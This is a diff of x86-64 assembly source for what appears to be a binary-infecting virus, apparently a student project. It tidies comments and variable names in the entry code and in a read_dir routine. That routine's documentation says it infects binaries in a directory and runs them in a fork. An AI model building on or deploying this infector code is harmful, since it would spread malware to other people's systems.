@@ -90,7 +90,7 @@ _start:
 	cmp		QWORD [rsp + 128], 4				; if argc == 4
 	je		_verify_starting_infect
 
-	;; Check if program arguments are passed via registers
+;; Check if program arguments are passed via registers
 _check_registers:
 	cmp		QWORD [rsp + 64], 3 				; if argc == 3
 	je		_alternative_start_by_registers		; 
@@ -261,14 +261,14 @@ _jmp_to_o_entry:
 ;;		read_dir
 ;;
 ;; SYNOPSYS
-;;		void	read_dir(bool recursif, char *actual_directory, char *path_of_dir)
+;;		void	read_dir(bool recur, char *actual_dir, char *path_of_dir)
 ;;
 ;; DESCRIPTION
-;;		Runs an infection on the directory pointed by actual_directory.
+;;		Runs an infection on the directory pointed by actual_dir at path_of_dir.
 ;;
 ;; NOTES
-;;		This function has 2 behaviors according to the boolean value of recursif.
-;;		If recursif is set to 1:
+;;		This function has 2 behaviors according to the boolean value of recur.
+;;		If recur is set to 1:
 ;;			It will infect one of the binaries located in this directory and then executes it
 ;;			into a fork with the _verif_argument.
 ;;
@@ -300,26 +300,33 @@ _read_dir:
 	;; Create stack frame
 	enter	392, 0
 	
-	mov		rdi, QWORD [rsp + 408]
-	mov		rsi, QWORD [rsp + 416]
-	mov		rax, QWORD [rsp + 424]
+	;; Access arguments passed via the stack
+	mov		rdi, QWORD [rsp + 408]		; 3rd arg (char *path_to_dir)
+	mov		rsi, QWORD [rsp + 416]		; 2nd arg (char *actual_dir)
+	mov		rax, QWORD [rsp + 424]		; 1st arg (bool recur)
+
+	;; Save up arguments
 	mov		QWORD [rsp + 368], rax
-	mov		QWORD [rsp + 312], rdi		; store first arg in stack
+	mov		QWORD [rsp + 312], rdi
 	mov		QWORD [rsp + 344], rsi
 	mov		QWORD [rsp + 360], 0
-	mov		rdi, rsi					; calcul len of arg 2
+
+	;; Get directory name length
+	mov		rdi, rsi
 	call	_ft_strlen
+	mov		QWORD [rsp + 328], rax
 	
-	mov		QWORD [rsp + 328], rax		; store arg2 len in stack
-	mov		rdi, QWORD [rsp + 312]		; take len of arg1
+	;; Get directory path length
+	mov		rdi, QWORD [rsp + 312]
 	call	_ft_strlen
+	mov		QWORD [rsp + 320], rax
 	
-	mov		QWORD [rsp + 320], rax		; store result in stack
-	mov		r10, QWORD [rsp + 320]
-	mov		QWORD [rsp + 336], r10
-	mov		r10, QWORD [rsp + 328]
-	add		QWORD [rsp + 336], r10
-	add		QWORD [rsp + 336], 2
+	;; Compute full path length
+	mov		r10, QWORD [rsp + 320]		; r10 = strlen(dirpath)
+	mov		QWORD [rsp + 336], r10		; total length += r10
+	mov		r10, QWORD [rsp + 328]		; r10 = strlen(dirname)
+	add		QWORD [rsp + 336], r10		; total length += r10
+	add		QWORD [rsp + 336], 2		; total length += 2 ('/' + '\0')
 
 	;; --------------------------------------------------------------------------------------------
 	;; NOTE
